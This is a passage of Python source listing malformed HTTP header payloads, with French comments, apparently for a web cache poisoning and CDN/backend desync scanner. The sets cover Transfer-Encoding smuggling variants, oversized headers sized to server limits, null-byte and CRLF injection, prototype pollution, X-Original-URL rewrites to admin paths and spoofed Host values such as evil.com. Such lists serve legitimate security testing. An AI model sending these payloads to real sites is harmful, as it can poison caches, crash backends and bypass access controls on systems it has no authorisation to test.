    # ===================================================================
    # Accept-Language impossible → 406
    # ===================================================================
    {"Accept-Language": "*;q=0"},
    {"Accept-Language": "xx-XX"},
    {"Accept-Language": "en;q=0, fr;q=0, *;q=0"},
    {"Accept-Language": "tlh"},
    {"Accept-Language": "und"},
    {"Accept-Language": "zxx"},
    {"Accept-Language": "mis"},
    {"Accept-Language": "mul"},

    # ===================================================================
    # Accept-Charset archaïque → 406
    # ===================================================================
    {"Accept-Charset": "*;q=0"},
    {"Accept-Charset": "utf-8;q=0, *;q=0"},
    {"Accept-Charset": "iso-8859-1;q=0, utf-8;q=0"},
    {"Accept-Charset": "ebcdic"},
    {"Accept-Charset": "utf-32"},
    {"Accept-Charset": "viscii"},
    {"Accept-Charset": "koi8-r;q=1, *;q=0"},

    # ===================================================================
    # Content-Type en requête GET - CDN ignore, backend bugue
    # ===================================================================
    {"Content-Type": "application/x-www-form-urlencoded", "Content-Length": "0"},
    {"Content-Type": "multipart/form-data; boundary=---", "Content-Length": "0"},
    {"Content-Type": "application/graphql"},
    {"Content-Type": "text/event-stream"},
    {"Content-Type": "application/grpc"},
    {"Content-Type": "application/cbor"},
    {"Content-Type": "application/msgpack"},
    {"Content-Type": "application/bson"},
    {"Content-Type": "application/protobuf"},
    {"Content-Type": "application/thrift"},
    {"Content-Type": "application/x-ndjson"},
    {"Content-Type": "application/vnd.api+json"},
    {"Content-Type": "application/hal+json"},
    {"Content-Type": "application/ld+json"},

    # ===================================================================
    # Méthode override + Content-Type combo
    # ===================================================================
    {"X-HTTP-Method-Override": "PATCH", "Content-Type": "application/merge-patch+json"},
    {"X-HTTP-Method-Override": "PATCH", "Content-Type": "application/json-patch+json"},
    {"X-HTTP-Method-Override": "REPORT"},
    {"X-HTTP-Method-Override": "PROPFIND"},
    {"X-HTTP-Method-Override": "MKCOL"},
    {"X-HTTP-Method-Override": "SEARCH"},
    {"X-HTTP-Method-Override": "QUERY"},

    # ===================================================================
    # Transfer-Encoding subtilités
    # ===================================================================
    {"Transfer-Encoding": "chunked, chunked"},
    {"Transfer-Encoding": "chunked;q=1.0"},
    {"Transfer-Encoding": " chunked"},
    {"Transfer-Encoding": "CHUNKED"},
    {"Transfer-Encoding": "chunked\t"},
    {"Transfer-Encoding": "identity, chunked"},
    {"Transfer-Encoding": "trailers"},

    # ===================================================================
    # Expect header sous-estimé
    # ===================================================================
    {"Expect": "100-continue", "Content-Length": "999999999"},
    {"Expect": "417-dontcare"},

    # ===================================================================
    # Accept-Ranges en requête (response header)
    # ===================================================================
    {"Accept-Ranges": "bytes"},
    {"Accept-Ranges": "none"},

    # ===================================================================
    # Headers numériques hors limites / overflow
    # ===================================================================
    {"Age": "4294967296"},
    {"Age": "-1"},
    {"Max-Forwards": "255"},
    {"Content-Length": "9" * 100},
    {"Content-Length": "00000000001"},
    {"Content-Length": "+1"},
    {"Content-Length": "1.0"},
    {"Content-Length": "0x10"},
    {"Content-Length": "1e5"},

    # ===================================================================
    # Headers avec encoding UTF-8 dans les noms
    # ===================================================================
    {"Accépt-Encoding": "gzip"},
    {"Accept\u200b-Encoding": "gzip"},
    {"Accept\u00ad-Encoding": "gzip"},
    {"Accept\uff0dEncoding": "gzip"},
    {"Acc\u0435pt-Encoding": "gzip"},
    {"Host\u0000": "evil.com"},

    # ===================================================================
    # Headers avec casing bizarre
    # ===================================================================
    {"ACCEPT-ENCODING": "gzip"},
    {"accept-encoding": "GZIP"},
    {"cONTENT-tYPE": "text/html"},
    {"tRANSFER-eNCODING": "chunked"},

    # ===================================================================
    # Valeurs numériques en encoding alternatif
    # ===================================================================
    {"Content-Length": "\u0660"},
    {"Content-Length": "\uff10"},
    {"Content-Length": "\u2081\u2080"},
    {"Content-Length": "\u00b9\u2070"},
    {"Max-Forwards": "\u2070"},

    # ===================================================================
    # Whitespace headers
    # ===================================================================
    {"X-Custom\r": "value"},
    {"X-Custom\n": "value"},
    {" Host": "evil.com"},
    {"Host ": "evil.com"},
    {"": "value"},
    {" ": "value"},

    # ===================================================================
    # Headers dupliqués contradictoires (casing différent)
    # ===================================================================
    {"Accept-Encoding": "gzip", "accept-encoding": "br"},
    {"Host": "site-a.com", "host": "site-b.com"},
    {"Content-Type": "text/html", "content-type": "application/json"},

    # ===================================================================
    # Combinaisons vicieuses multi-headers
    # ===================================================================
    {"Accept-Encoding": "identity;q=0, *;q=0", "Cache-Control": "only-if-cached"},
    {"Connection": "Accept-Encoding", "Accept-Encoding": "gzip", "Cache-Control": "only-if-cached"},
    {"Accept": "*/*;q=0", "Accept-Language": "*;q=0", "Accept-Charset": "*;q=0"},
    {"Prefer": "wait=0", "Expect": "100-continue", "Content-Length": "999999999"},
    {"Transfer-Encoding": "chunked", "Content-Length": "1", "Connection": "Transfer-Encoding"},
        # ===================================================================
    # HHO ciblé - Header Oversize entre limites CDN/backend
    # Nginx: 8KB total, Apache: 8KB, IIS: 16KB, Tomcat: 8KB
    # ===================================================================
    {"Cookie": "a=" + "B" * 7500},
    {"Cookie": "; ".join([f"c{i}=v{i}" for i in range(500)])},
    {"Referer": "https://legit.com/" + "a" * 7500},
    {"Authorization": "Bearer " + "A" * 7500},
    {"User-Agent": "Mozilla/5.0 " + "(" + "a" * 7000 + ")"},

    # ===================================================================
    # Null byte / caractères de contrôle dans les valeurs
    # Passe le CDN (string), crash les backends C-based
    # ===================================================================
    {"X-Custom": "before\x00after"},
    {"X-Custom": "val\x01ue"},
    {"X-Custom": "val\x7fue"},
    {"X-Custom": "\x0b"},
    {"X-Custom": "\x0c"},
    {"X-Custom": "\x1b[31mred\x1b[0m"},
    {"Cookie": "session=abc\x00def"},
    {"Referer": "https://site.com/\x00admin"},
    {"User-Agent": "Mozilla\x00/5.0"},

    # ===================================================================
    # Obs-fold (line folding) - déprécié HTTP/1.1 mais encore parsé
    # CDN et backend interprètent différemment
    # ===================================================================
    {"X-Custom": "value\r\n\tcontinuation"},
    {"X-Custom": "value\r\n continuation"},
    {"X-Custom": "line1\r\n\tline2\r\n\tline3"},
    {"Accept-Encoding": "gzip\r\n\t, br"},

    # ===================================================================
    # Spring Boot - actuator confusion
    # ===================================================================
    {"X-Forwarded-Prefix": "/actuator"},
    {"X-Forwarded-Prefix": "/env"},

    # ===================================================================
    # Prototype pollution via headers (Express.js / Node)
    # ===================================================================
    {"__proto__": "polluted"},
    {"constructor": "polluted"},

    # ===================================================================
    # PHP header injection / Python encoding crash
    # ===================================================================
    {"X-Custom": "value\r\nX-Injected: true"},
    {"Content-Type": "text/html; charset=\x80"},

    # ===================================================================
    # IIS specifics
    # ===================================================================
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},

    # ===================================================================
    # Accept-Encoding malformé / paramètres invalides
    # CDN normalise dans cache key, forward la valeur originale
    # ===================================================================
    {"Accept-Encoding": "gzip , deflate , br"},
    {"Accept-Encoding": "gzip\t,\tdeflate"},
    {"Accept-Encoding": "gzip;q=invalid"},
    {"Accept-Encoding": "gzip;q="},
    {"Accept-Encoding": "gzip;q"},
    {"Accept-Encoding": "gzip;notq=1"},
    {"Accept-Encoding": "gzip;level=9"},
    {"Accept-Encoding": "deflate;memlevel=9"},

    # ===================================================================
    # Vary header abuse - headers qui changent la variante cachée
    # ===================================================================
    {"X-Requested-With": ""},
    {"X-Requested-With": "ShockwaveFlash"},
    {"Accept": "text/html;q=0.001"},
    {"Accept-Encoding": ""},

    # ===================================================================
    # Semicolon / path parameter confusion
    # ===================================================================
    {"X-Forwarded-Prefix": "/path;param=value"},
    {"X-Original-URL": "/page;.json"},
    {"X-Original-URL": "/page;/../../admin"},

    # ===================================================================
    # Date malformée - crash de parsers
    # ===================================================================
    {"If-Modified-Since": "0"},
    {"If-Modified-Since": "-1"},
    {"If-Modified-Since": "epoch"},
    {"If-Modified-Since": "9" * 50},
    {"If-Modified-Since": "Thu, 01 Jan 1970 00:00:00 UTC"},
    {"If-Modified-Since": "2024-01-01T00:00:00Z"},
    {"If-Modified-Since": "1704067200"},
    {"Date": "0"},
    {"Date": "Thu, 32 Dec 2024 25:61:61 GMT"},

    # ===================================================================
    # ETag tricks - oversize, null, malformé
    # ===================================================================
    {"If-None-Match": '""'},
    {"If-None-Match": '"' + "A" * 8000 + '"'},
    {"If-None-Match": ", ".join([f'"etag{i}"' for i in range(500)])},
    {"If-None-Match": '"\x00"'},
    {"If-None-Match": '"\\'},

    # ===================================================================
    # Host header tricks
    # ===================================================================
    {"Host": "."},
    {"Host": ""},
    {"Host": "0"},
    {"Host": "["},
    {"Host": "[::]"},
    {"Host": "[::ffff:127.0.0.1]"},

    # ===================================================================
